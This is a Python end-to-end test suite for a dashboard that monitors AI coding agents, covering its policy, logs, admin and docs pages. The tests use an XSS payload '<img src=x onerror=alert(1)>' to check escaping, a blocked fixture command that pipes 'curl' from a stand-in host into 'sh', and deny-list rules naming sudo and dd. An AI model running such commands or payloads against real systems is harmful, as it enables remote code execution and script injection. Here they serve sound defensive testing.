"""Every page rendered in a real headless browser, through the same login a
person uses: the printed URL, the token the page takes from it, the hash
route, the page's own fetches under its Content-Security-Policy."""
import json
import os
import re
import shutil
import tempfile
import threading
import unittest
import urllib.parse

from fleetdash import config as cfgmod
from fleetdash import server

from tests.e2e.harness import ROOT, Server, at, browser, cli, full_config, populated_fleet, render
from tests.fixtures import admin_line


def scripted(config, root, route, script):
    """The page at route after script ran once the page was ready: the
    page's own files with the script added to the end of app.js, served by
    the server in this process, since a headless browser that only prints
    the page cannot click or type. The script gets the login token as TOKEN."""
    web = tempfile.mkdtemp(prefix="web-", dir=root)
    shutil.rmtree(web)
    shutil.copytree(os.path.join(ROOT, "web"), web)
    httpd = server.make_server(dict(cfgmod.load(config), port=0), web=web)
    with open(os.path.join(web, "app.js"), "a") as fh:
        fh.write("""
{ const TOKEN = %s;
  new MutationObserver((_, o) => {
    if (main.dataset.state !== "ready") return;
    o.disconnect();
    %s
  }).observe(main, { attributes: true }); }
""" % (json.dumps(httpd.token), script))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        return render("http://127.0.0.1:%d/#token=%s#%s" % (httpd.server_address[1], httpd.token, route))
    finally:
        httpd.shutdown()
        httpd.server_close()


class EveryPageRenders(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        browser()  # fail (or skip on purpose) before building anything
        cls.f = populated_fleet()
        config = full_config(cls.f)
        cli(config, "ingest")
        cls.srv = Server(config)
        cls.home = render(cls.srv.url)

    @classmethod
    def tearDownClass(cls):
        cls.srv.stop()
        cls.f.close()

    def pages(self):
        self.assertGreaterEqual(len(self.home.nav), 9, self.home.nav)  # a pass over no pages is a failure
        return self.home.nav

    def test_the_login_url_lands_on_the_overview(self):
        self.assertEqual((self.home.main.get("data-page"), self.home.main.get("data-state")),
                         ("overview", "ready"), self.home.main_text[:300])

    def test_each_page_in_the_navigation_loads_and_its_headline_matches_the_link(self):
        for page, label in self.pages():
            with self.subTest(page=page):
                p = render(self.srv.url + "#/" + page)
                self.assertEqual(p.main.get("data-page"), page)
                self.assertEqual(p.main.get("data-state"), "ready", p.main_text[:300])
                self.assertEqual(p.h1.strip(), label)

    # one thing only the fleet's own data can put on each page
    SHOWS = {"overview": "alice", "logs": "alice", "sessions": "alice", "people": "alice",
             "hosts": "test-host", "policy": "Bash(sudo:*)", "docs": "Operator guide", "update": "Say hello",
             "admin": "alice"}

    def test_each_page_shows_the_fleets_own_data(self):
        self.assertEqual(sorted(page for page, _ in self.pages()), sorted(self.SHOWS))
        for page, _ in self.pages():
            with self.subTest(page=page):
                self.assertIn(self.SHOWS[page], render(self.srv.url + "#/" + page).main_text)

    def test_each_page_names_the_site_and_how_fresh_the_data_is(self):
        for page, _ in self.pages():
            with self.subTest(page=page):
                dom = render(self.srv.url + "#/" + page).dom
                self.assertIn('<small id="host">test-host</small>', dom)
                self.assertIn('id="fresh">Data as of ', dom)

    def test_no_page_prints_a_value_it_failed_to_turn_into_text(self):
        for page, _ in self.pages():
            with self.subTest(page=page):
                text = render(self.srv.url + "#/" + page).main_text
                for leak in ("[object", "undefined", "null", "NaN"):
                    self.assertNotIn(leak, text)

    def test_hosts_flags_a_policy_that_is_not_the_repositorys(self):
        p = render(self.srv.url + "#/hosts")
        self.assertIn('<span class="sev error"', p.dom)
        self.assertIn("differs", p.main_text)

    def test_policy_says_what_differs_and_never_shows_an_env_value(self):
        p = render(self.srv.url + "#/policy")
        self.assertIn("They differ in: sandbox.", p.main_text)
        self.assertIn("HTTPS_PROXY", p.main_text)
        self.assertNotIn("proxy.invalid", p.dom)

    def route(self, *edits):
        # written as the page writes it, so a link the page makes can be looked for
        edits = [{"op": op, "list": kind, "rule": rule} for op, kind, rule in edits]
        return "#/policy/" + urllib.parse.quote(json.dumps(edits, separators=(",", ":")), safe="!*'()")

    def draft(self, *edits):
        return self.srv.url + self.route(*edits)

    def test_policy_offers_a_draft_and_shows_no_patch_until_one_is_asked_for(self):
        p = render(self.srv.url + "#/policy")
        self.assertIn("Nothing is applied from this page", p.main_text)
        self.assertIn("Add to draft", p.main_text)
        # the rules that can be taken out are the repository's
        self.assertIn('<option value="[&quot;ask&quot;,&quot;Bash(git push:*)&quot;]">', p.dom)
        self.assertNotIn('<pre class="patch"', p.dom)
        self.assertNotIn("git apply", p.main_text)

    def test_a_drafted_change_is_a_patch_with_how_to_apply_it_and_a_way_back(self):
        hostile = "<img src=x onerror=alert(1)>"
        p = render(self.draft(("add", "deny", "Bash(dd:*)"), ("remove", "allow", "Read"), ("add", "ask", hostile)))
        self.assertRegex(p.dom, r'<pre class="patch">[^<]*\n\+ +"Bash\(dd:\*\)"')
        self.assertRegex(p.dom, r'<pre class="patch">[^<]*\n- +"Read"')
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", p.dom)
        self.assertNotIn("<img", p.dom)
        # the lists here are a line or two long, so the patch has no lines around a change
        self.assertIn("git apply --unidiff-zero policy-change.patch", p.main_text)
        self.assertIn("Download the patch", p.main_text)
        # each change can be taken out again: a link to the draft without it
        self.assertEqual(p.dom.count(">Take out</a>"), 3)
        self.assertIn('href="%s"' % self.route(("add", "deny", "Bash(dd:*)"), ("add", "ask", hostile)), p.dom)

    def test_a_draft_that_cannot_be_made_says_why_and_shows_no_patch(self):
        p = render(self.draft(("add", "deny", "Bash(sudo:*)")))
        self.assertIn("Bash(sudo:*) is already in the deny list", p.main_text)
        self.assertNotIn('<pre class="patch"', p.dom)
        self.assertEqual(p.dom.count(">Take out</a>"), 1)
        q = render(self.srv.url + "#/policy/not-a-draft")
        self.assertIn("edits must be a JSON list of changes", q.main_text)

    def test_a_document_is_rendered_as_elements_and_its_markup_stays_text(self):
        p = render(self.srv.url + "#/docs")
        self.assertIn('<h2 id="section-operator-guide">Operator guide</h2>', p.dom)
        self.assertIn("<td><code>0</code></td><td>done</td>", p.dom)
        self.assertIn("<li>nested <strong>bold</strong></li>", p.dom)
        self.assertIn("<pre><code>make verify</code></pre>", p.dom)
        self.assertNotIn("<img", p.dom)
        self.assertIn("<img src=x onerror=alert(1)> stays text.", p.main_text)

    def test_a_link_opens_a_listed_document_and_no_other_file(self):
        p = render(self.srv.url + "#/docs")
        self.assertIn('<a href="#/docs/0%3Asub%2FOther.md">the other page</a>', p.dom)
        self.assertIn('<span class="nolink" title="../secret.md is not in this list">a file that is not listed</span>', p.dom)
        self.assertIn('<a href="https://example.com/x" target="_blank" rel="noopener noreferrer">the web</a>', p.dom)
        other = render(self.srv.url + "#/docs/0%3Asub%2FOther.md")
        self.assertEqual(other.main.get("data-state"), "ready")
        self.assertIn('<h2 id="section-the-other-page">The other page</h2>', other.dom)
        self.assertIn('<a href="#/docs/0%3AGuide.md">the guide</a>', other.dom)
        # a document in another group of the list, reached by its place on disk
        self.assertIn('<a href="#/docs/1%3AGOAL.md">the goal</a>', other.dom)

    GUIDE, OTHER, GOAL = "#/docs/0%3AGuide.md", "#/docs/0%3Asub%2FOther.md", "#/docs/1%3AGOAL.md"

    def sections(self, dom):
        """The entries of a document's own contents, as (address, marked as where the reader is)."""
        nav = re.search(r'<nav class="toc" aria-label="On this page">(.*?)</nav>', dom, re.S)
        return [(href, bool(here)) for href, here in
                re.findall(r'<a href="([^"]*)"(?: class="sub")?( aria-current="location")?>', nav.group(1))] if nav else None

    def test_a_documents_sections_are_listed_beside_it_in_order_and_each_has_an_address(self):
        p = render(self.srv.url + "#/docs")
        slugs = ["run-it", "exit-codes", "check-it-twice", "exit-codes-1"]
        self.assertEqual(self.sections(p.dom), [(self.GUIDE + "/" + s, False) for s in slugs])
        for slug in slugs:
            self.assertEqual(p.dom.count('id="section-%s"' % slug), 1)
        # markup in a heading is the heading's words in the list, and a lower heading is set in
        self.assertIn('<a href="%s/check-it-twice">Check it twice</a>' % self.GUIDE, p.dom)
        self.assertIn('<a href="%s/exit-codes-1" class="sub">Exit codes</a>' % self.GUIDE, p.dom)
        # a heading further down has an address written as GitHub writes it, and is not in the list
        self.assertIn('<h5 id="section-whats-next">What\'s next?</h5>', p.dom)
        # a document with no sections has no list of them
        self.assertIsNone(self.sections(render(self.srv.url + self.GOAL).dom))

    def test_a_document_in_parts_lists_each_part_after_its_title_among_its_sections(self):
        nav = re.search(r'<nav class="toc" aria-label="On this page">(.*?)</nav>', render(self.srv.url + self.OTHER).dom, re.S).group(1)
        self.assertEqual(re.findall(r'<a href="([^"]*)"(?: class="([a-z]+)")?>([^<]*)</a>', nav),
                         [(self.OTHER + "/part-two", "part", "Part two"), (self.OTHER + "/inside-it", "", "Inside it")])

    def test_the_address_of_a_section_opens_its_document_and_marks_the_section(self):
        p = render(self.srv.url + self.GUIDE + "/exit-codes-1")
        self.assertEqual(p.main.get("data-state"), "ready")
        self.assertEqual([href for href, here in self.sections(p.dom) if here], [self.GUIDE + "/exit-codes-1"])
        self.assertIn('<a href="%s" title="Guide.md" aria-current="page">' % self.GUIDE, p.dom)
        # a section the document does not have is still the document
        q = render(self.srv.url + self.GUIDE + "/no-such-section")
        self.assertIn('<h2 id="section-operator-guide">Operator guide</h2>', q.dom)
        self.assertEqual([here for _, here in self.sections(q.dom)], [False] * 4)

    def test_a_link_to_a_section_goes_to_that_section(self):
        self.assertIn('<a href="%s/exit-codes">the exit codes</a>' % self.GUIDE, render(self.srv.url + "#/docs").dom)
        self.assertIn('<a href="%s/exit-codes">its codes</a>' % self.GUIDE, render(self.srv.url + self.OTHER).dom)

    def test_a_document_ends_with_the_one_before_it_and_the_one_after(self):
        def pager(route):
            dom = render(self.srv.url + route).dom
            return re.findall(r'<a class="(prev|next)" href="([^"]*)"><span class="muted">(Previous|Next)</span>([^<]*)</a>',
                              re.search(r'<nav class="pager" aria-label="More documents">(.*?)</nav>', dom, re.S).group(1))
        self.assertEqual(pager("#/docs"), [("next", self.OTHER, "Next", "The other page")])
        self.assertEqual(pager(self.OTHER), [("prev", self.GUIDE, "Previous", "Operator guide"), ("next", self.GOAL, "Next", "The goal")])
        self.assertEqual(pager(self.GOAL), [("prev", self.OTHER, "Previous", "The other page")])

    def test_a_title_is_listed_by_its_name_and_the_rest_is_said_under_it(self):
        p = render(self.srv.url + self.GOAL)
        self.assertIn('<a href="%s" title="GOAL.md" aria-current="page">The goal</a>' % self.GOAL, p.dom)
        # the heading keeps the address GitHub gives the whole title
        self.assertIn('<h2 id="section-the-goal--what-every-change-serves">The goal</h2>'
                      '<p class="lead">what every change serves</p>', p.dom)
        # a title with no dash has no line under it
        self.assertNotIn('class="lead"', render(self.srv.url + self.GUIDE).dom)

    def test_a_block_of_code_has_a_button_that_copies_it(self):
        p = render(self.srv.url + "#/docs")
        self.assertIn('<div class="code"><pre><code>make verify</code></pre>'
                      '<button type="button" class="copy" aria-live="polite">Copy</button></div>', p.dom)
        self.assertEqual(p.dom.count('class="copy"'), p.dom.count("<pre>"))

    def test_the_list_of_documents_can_be_filtered(self):
        p = render(self.srv.url + "#/docs")
        self.assertIn('<input type="search" class="filter" placeholder="Filter documents" aria-label="Filter documents">', p.dom)
        self.assertIn('<p class="muted nomatch" hidden="">No document matches.</p>', p.dom)

    def test_an_address_typed_with_its_slash_as_it_is_still_opens_the_document(self):
        p = render(self.srv.url + "#/docs/0:sub/Other.md")
        self.assertIn('<h2 id="section-the-other-page">The other page</h2>', p.dom)

    def test_overview_has_one_table_for_the_subscription_and_one_for_bedrock(self):
        p = render(self.srv.url)
        tables = {}
        for cls in ("anthropic", "bedrock"):
            start = p.dom.index('<section class="provider %s">' % cls)
            tables[cls] = p.dom[start:p.dom.index("</section>", start)]
        # the same model name in both, each with its own tokens: bob's 1k-input call is the Bedrock one
        self.assertIn("Claude subscription, through Anthropic", tables["anthropic"])
        self.assertIn("Amazon Bedrock", tables["bedrock"])
        for cls in tables:
            self.assertIn("<td>claude-opus-5-5</td>", tables[cls])
            self.assertIn("<tfoot>", tables[cls])
        self.assertIn('title="1,000"', tables["bedrock"])
        self.assertNotIn('title="1,000"', tables["anthropic"])
        self.assertIn('title="900,020"', tables["anthropic"])

    def test_update_shows_the_command_line_each_command_will_run(self):
        p = render(self.srv.url + "#/update")
        self.assertIn("Prints one line and changes nothing.", p.main_text)
        self.assertIn('<p class="cmd">', p.dom)
        self.assertIn("hello from the action", p.dom[p.dom.index('<p class="cmd">'):])  # it is in the command line itself

    def test_update_shows_what_a_run_was_started_with_and_all_it_printed(self):
        run = self.srv.run("say-hello")
        self.assertEqual((run["state"], run["output"]), ("done", "hello from the action\n"))
        for url in (self.srv.url + "#/update", self.srv.url + "#/update/%d" % run["run"]):
            with self.subTest(url=url):
                p = render(url)
                self.assertEqual(p.main.get("data-state"), "ready", p.main_text[:300])
                self.assertIn('aria-label="Output of run %d">hello from the action\n</pre>' % run["run"], p.dom)
                facts = p.dom[p.dom.index('<dl class="facts">'):]
                facts = facts[:facts.index("</dl>")]
                self.assertIn('<span class="sev pass">exit code 0</span>', facts)
                self.assertIn("hello from the action", facts)  # the command line it was started with
                self.assertIn("<dt>Command</dt>", p.dom)
                self.assertIn('<a href="#/update/%d" aria-current="true">Run %d</a>' % (run["run"], run["run"]), p.dom)
                self.assertIn("All of it, also kept in ", p.main_text)

    def test_update_opens_an_earlier_run_by_its_number_and_the_newest_otherwise(self):
        first = self.srv.run("say-hello")
        second = self.srv.run("say-hello")
        self.assertIn("<h2>Run %d, Say hello</h2>" % second["run"], render(self.srv.url + "#/update").dom)
        self.assertIn("<h2>Run %d, Say hello</h2>" % first["run"],
                      render(self.srv.url + "#/update/%d" % first["run"]).dom)
        # a number that is not a kept run falls back to the newest, it does not break the page
        gone = render(self.srv.url + "#/update/999999")
        self.assertEqual(gone.main.get("data-state"), "ready")
        self.assertIn("<h2>Run %d, Say hello</h2>" % second["run"], gone.dom)

    def test_a_logged_command_is_shown_as_text_not_markup(self):
        p = render(self.srv.url + "#/logs")
        self.assertIn("make test", p.main_text)

    def test_people_shows_limit_hits_and_why_someone_looks_under_used(self):
        p = render(self.srv.url + "#/people")
        # bob used 1k tokens against a median of about 0.5M; alice hit one 5-hour limit
        # the flag in bob's row, not the rule text above the table, which says the same words
        self.assertIn('<span class="flag">under 10% of the median</span>', p.dom)
        self.assertIn("1 five-hour, 0 weekly", p.main_text)

    def test_an_unknown_route_falls_back_to_the_overview(self):
        p = render(self.srv.url + "#/no-such-page")
        self.assertEqual((p.main.get("data-page"), p.main.get("data-state")), ("overview", "ready"))

    def test_without_the_token_the_browser_gets_the_frame_and_no_figure(self):
        for url in (self.srv.base + "/", self.srv.base + "/#/people", self.srv.base + "/#token=wrong#/people"):
            with self.subTest(url=url):
                p = render(url)
                self.assertEqual(p.main.get("data-state"), "locked")
                self.assertIn("Open the address", p.main_text)
                self.assertNotIn("alice", p.dom)
                self.assertNotIn("test-host", p.dom)

    def test_the_token_is_taken_out_of_the_address_once_the_page_has_it(self):
        p = render(self.srv.url + "#/people")
        self.assertEqual(p.main.get("data-page"), "people")
        # the page writes where it is into the frame, so a test can read it back
        self.assertIn('data-at="#/people"', p.dom)
        self.assertNotIn(self.srv.token, p.dom)


class AdminPage(unittest.TestCase):
    """The shared fleet plus what only the Admin page shows: carol holds a
    seat and has sent nothing, dave's hook log is a symlink and is refused,
    one of alice's passes is older than passes are kept, and alice held the
    privileged session over her two logged events while bob was refused it."""

    @classmethod
    def setUpClass(cls):
        browser()
        cls.f = populated_fleet()
        cls.f.hooklog("activity", "alice", [{"ts": at(40, "10:00"), "tool": "Bash", "detail": "an old pass"}])
        os.symlink(os.path.join(cls.f.root, "elsewhere"), os.path.join(cls.f.root, "log", "activity", "dave.jsonl"))
        log = cls.f.adminlog([
            admin_line(at(2, "09:59"), 41, "alice", "admin session START bin=/usr/local/bin/claude eval=0"),
            admin_line(at(2, "10:05"), 41, "alice", "admin session END rc=0"),
            admin_line(at(1, "08:00"), 52, "alice", "admin session START bin=/usr/local/bin/claude eval=0"),
            admin_line(at(1, "09:00"), 60, "bob", "REFUSED reason=unauthorised group=claude-admins", target="root")])
        config = full_config(cls.f, admin_log=log,
                             seats=[{"tier": "Max", "monthly_usd": 100.0, "users": ["alice", "carol"]}])
        cli(config, "ingest")
        cls.srv = Server(config)

    @classmethod
    def tearDownClass(cls):
        cls.srv.stop()
        cls.f.close()

    def test_admin_says_who_is_sending_who_never_has_and_who_was_refused(self):
        p = render(self.srv.url + "#/admin")
        self.assertEqual(p.h1, "Admin")
        self.assertIn('<td>carol</td><td class="">Max</td><td><span class="sev info">never sent</span></td>', p.dom)
        self.assertIn('<td>alice</td><td class="">Max</td><td><span class="sev pass">sending</span></td>', p.dom)
        self.assertIn("file not read: symlink, not followed", p.main_text)
        self.assertIn('<b>1</b><span>files refused</span>', p.dom)

    def test_admin_shows_each_privileged_session_with_what_ran_in_it_and_each_refusal(self):
        p = render(self.srv.url + "#/admin")
        self.assertEqual(p.main.get("data-state"), "ready", p.main_text[:300])
        self.assertIn('<b>2</b><span>privileged sessions</span>', p.dom)
        self.assertIn('<td class="n">6 min</td><td>%s <span class="sev pass">exit code 0</span></td>'
                      % at(2, "10:05").replace("T", " ")[:16], p.dom)
        # the tool call the hooks logged for alice inside those six minutes; her redaction is neither a call nor a block
        self.assertIn("<summary>1 tool call, 0 blocked</summary>", p.dom)
        self.assertIn('<span class="cmd">make test</span>', p.dom)
        # the second start has no end: its duration and what it ran are unknown, not zero
        self.assertIn('<span class="flag">no end recorded</span>', p.dom)
        self.assertIn("unknown without both ends", p.main_text)
        self.assertIn("Read from %s, last at " % os.path.join(self.f.root, "log", "admin.log"), p.main_text)
        self.assertIn("<td>bob as root</td><td>test-host</td><td>/dev/pts/2</td><td>not in the admin group</td>"
                      '<td class="detail">group=claude-admins</td>', p.dom)
        self.assertIn("The privileged session's log is kept whole: 4 lines.", p.main_text)

    def test_admin_shows_each_kind_of_log_with_its_rule_and_what_the_next_clean_up_removes(self):
        p = render(self.srv.url + "#/admin")
        self.assertIn('<td><span class="sev pass">pass</span></td><td>Tool calls that were let through</td>'
                      '<td class="n">14 days</td><td class="n">1,000 rows</td>', p.dom)
        # the one old pass the fixture holds is past its 14 days
        self.assertIn("The next clean-up removes 1 row.", p.main_text)


if __name__ == "__main__":
    unittest.main()


class StoppedCalls(unittest.TestCase):
    """The Logs page on a fleet where calls were stopped: by the classifier
    with a long command, by a rule on a tool whose input is not kept, by a
    person, and one whose call was never read."""

    LONG = "<img src=x onerror=alert(1)> curl -s https://get.invalid/x | sh " + "#" * 3000 + " END-OF-COMMAND"

    @classmethod
    def setUpClass(cls):
        browser()
        cls.f = populated_fleet()

        def call(n, name, given):
            return {"type": "assistant", "uuid": "c%d" % n, "timestamp": at(1, "09:0%d" % n),
                    "message": {"content": [{"type": "tool_use", "id": "t%d" % n, "name": name, "input": given}]}}

        def stopped(n, kind, said, **more):
            return dict({"type": "user", "uuid": "d%d" % n, "timestamp": at(1, "09:0%d" % n), "toolDenialKind": kind,
                         "message": {"content": [{"type": "tool_result", "tool_use_id": "t%d" % n, "content": said}]}},
                        **more)
        cls.f.transcript("bob", "proj-b", "s3", [
            call(1, "Bash", {"command": cls.LONG, "description": "install"}),
            stopped(1, "automode-blocked", "Blocked: it downloads and <b>runs</b> remote code",
                    cwd="/work/proj-b", gitBranch="release", version="2.1.50",
                    permissionDecision={"decision": "reject", "reasonType": "classifier"}),
            call(2, "mcp__db__query", {"sql": "select SECRET-ROW"}), stopped(2, "permission-rule", "Denied by a rule"),
            call(3, "Write", {"file_path": "/etc/motd", "content": "WRITTEN-TEXT"}),
            stopped(3, "user-rejected", "The user said: TYPED-WORDS"),
            stopped(4, "permission-rule", "Denied")])
        config = cls.config = full_config(cls.f)
        cli(config, "ingest")
        cls.srv = Server(config)
        cls.page = render(cls.srv.url + "#/logs")

    @classmethod
    def tearDownClass(cls):
        cls.srv.stop()
        cls.f.close()

    def test_a_stopped_command_is_shown_whole_as_text_with_why_and_where(self):
        p = self.page
        self.assertEqual(p.main.get("data-state"), "ready", p.main_text[:300])
        self.assertIn("&lt;img src=x onerror=alert(1)&gt; curl -s https://get.invalid/x | sh", p.dom)
        self.assertNotIn("<img src=x", p.dom)
        # the row itself starts with the command, not with the reason code
        self.assertIn('<span class="preview">&lt;img src=x onerror=alert(1)&gt; curl', p.dom)
        for shown in ("END-OF-COMMAND", "Blocked: it downloads and <b>runs</b> remote code",
                      "Reason code classifier", "/work/proj-b", "release", "2.1.50", "s3", "t1"):
            self.assertIn(shown, p.main_text)
        self.assertIn("%s characters in all. The middle was left out." % format(len(self.LONG), ","), p.main_text)

    def test_the_row_of_a_hook_denial_opens_onto_its_record_too(self):
        self.assertIn('<span class="preview">sudo x</span>', self.page.dom)

    def test_a_record_is_a_row_of_its_own_across_the_table_and_closed_until_asked_for(self):
        dom = self.page.dom
        records = re.findall(r'<tr class="record" id="(record-\d+)" hidden=""><td colspan="(\d+)">', dom)
        self.assertEqual(len(records), dom.count('<span class="preview">'))
        self.assertGreaterEqual(len(records), 5)
        heads = len(re.findall(r"<th[ >]", dom.partition("</thead>")[0]))
        self.assertEqual({int(n) for _, n in records}, {heads})
        for name, _ in records:
            self.assertEqual(dom.count('aria-controls="%s"' % name), 1)
        self.assertEqual(dom.count('aria-expanded="false"'), len(records))

    def test_a_record_does_not_say_again_what_its_row_says(self):
        records = re.findall(r'<tr class="record" id="record-\d+" hidden="">.*?</tr>', self.page.dom, re.S)
        self.assertGreaterEqual(len(records), 5)
        for record in records:
            for said_by_the_row in ("Person", "Host", "When (UTC)", "Tool", "Stopped by"):
                self.assertNotIn(">%s<" % said_by_the_row, record)

    def test_a_click_on_the_row_opens_its_record_and_a_second_closes_it(self):
        for clicks, hidden, expanded in ((1, False, "true"), (2, True, "false")):
            with self.subTest(clicks=clicks):
                dom = self.clicked(clicks)
                first = re.search(r'<tr class="record" id="record-0"( hidden="")?>', dom)
                self.assertEqual(bool(first.group(1)), hidden)
                self.assertIn('aria-expanded="%s" aria-controls="record-0"' % expanded, dom)
                self.assertEqual(dom.count('aria-expanded="true"'), 2 - clicks)

    def clicked(self, times):
        """The Logs page after its first stopped call's row was clicked: the
        page's own files with a click added to the end of its script, served
        by the server in this process, since a headless browser that only
        prints the page cannot click."""
        web = os.path.join(self.f.root, "web-%d" % times)
        shutil.copytree(os.path.join(ROOT, "web"), web)
        with open(os.path.join(web, "app.js"), "a") as fh:
            fh.write("""
new MutationObserver((_, o) => {
  if (main.dataset.state !== "ready") return;
  o.disconnect();
  for (let n = 0; n < %d; n++) document.querySelector("tr.has-record td").click();
}).observe(main, { attributes: true });
""" % times)
        httpd = server.make_server(dict(cfgmod.load(self.config), port=0), web=web)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        try:
            return render("http://127.0.0.1:%d/#token=%s#/logs" % (httpd.server_address[1], httpd.token)).dom
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_what_is_not_kept_is_said_to_be_not_recorded_and_is_not_shown(self):
        text = self.page.main_text
        self.assertIn("Only a command, file, URL or path is kept; this call had sql.", text)
        self.assertIn("The call was not in the part of the chat read with this block.", text)
        self.assertIn("/etc/motd", text)
        for kept_out in ("SECRET-ROW", "WRITTEN-TEXT", "TYPED-WORDS"):
            self.assertNotIn(kept_out, self.page.dom)



class DocsByHand(unittest.TestCase):
    """The Docs page acted on: a filter typed, a copy button pressed with the
    clipboard taking the text and with it refusing, and the login address
    opened again in a tab that already has the page."""

    @classmethod
    def setUpClass(cls):
        browser()
        cls.f = populated_fleet()
        cls.config = full_config(cls.f)
        cli(cls.config, "ingest")

    @classmethod
    def tearDownClass(cls):
        cls.f.close()

    def entries(self, dom):
        """(document's address, shown) for every entry of the list, and (group, shown)."""
        nav = re.search(r'<nav class="doclist" aria-label="Documents">(.*?)</nav>', dom, re.S).group(1)
        return (re.findall(r'<a href="([^"]*)"[^>]*?( hidden="")?>', nav),
                re.findall(r'<p class="group"( hidden="")?>([^<]*)</p>', nav))

    def typed(self, words):
        return scripted(self.config, self.f.root, "/docs", """
const box = document.querySelector("input.filter");
box.value = %s;
box.dispatchEvent(new Event("input"));""" % json.dumps(words)).dom

    def test_a_filter_keeps_the_documents_whose_name_or_file_holds_it(self):
        GUIDE, OTHER, GOAL = EveryPageRenders.GUIDE, EveryPageRenders.OTHER, EveryPageRenders.GOAL
        # (typed, documents left, groups left): a group with nothing left in it goes too
        for words, shown, groups in (("other", {OTHER}, {"Guides"}), ("GUIDE.MD", {GUIDE}, {"Guides"}),
                                     ("every change", {GOAL}, {"Goal"}), ("", {GUIDE, OTHER, GOAL}, {"Guides", "Goal"})):
            with self.subTest(words=words):
                dom = self.typed(words)
                links, heads = self.entries(dom)
                self.assertEqual(len(links), 3)  # a filter that matched nothing would also pass an empty list
                self.assertEqual({href for href, hidden in links if not hidden}, shown)
                self.assertEqual({name for hidden, name in heads if not hidden}, groups)
                self.assertIn('<p class="muted nomatch" hidden="">', dom)

    def test_a_filter_that_matches_nothing_says_so(self):
        dom = self.typed("no such words")
        links, _ = self.entries(dom)
        self.assertEqual([hidden for _, hidden in links], [' hidden=""'] * 3)
        self.assertIn('<p class="muted nomatch">No document matches.</p>', dom)

    def pressed(self, clipboard):
        return scripted(self.config, self.f.root, "/docs", """
navigator.clipboard.writeText = text => { document.body.dataset.copied = text; return %s; };
document.querySelector("button.copy").click();""" % clipboard).dom

    def test_the_copy_button_says_it_copied_the_block(self):
        dom = self.pressed("Promise.resolve()")
        self.assertIn('data-copied="make verify"', dom)
        self.assertIn('<button type="button" class="copy" aria-live="polite">Copied</button>', dom)

    def test_the_copy_button_says_when_the_clipboard_refused(self):
        dom = self.pressed('Promise.reject(new Error("denied"))')
        self.assertIn('<button type="button" class="copy" aria-live="polite">Could not copy</button>', dom)

    def test_the_login_address_opened_again_in_the_same_tab_logs_in_and_goes_to_its_page(self):
        p = scripted(self.config, self.f.root, "/people", 'location.hash = "#token=" + TOKEN + "#/docs";')
        self.assertEqual((p.main.get("data-page"), p.main.get("data-at"), p.main.get("data-state")), ("docs", "#/docs", "ready"))
        self.assertNotIn("token=", p.dom)
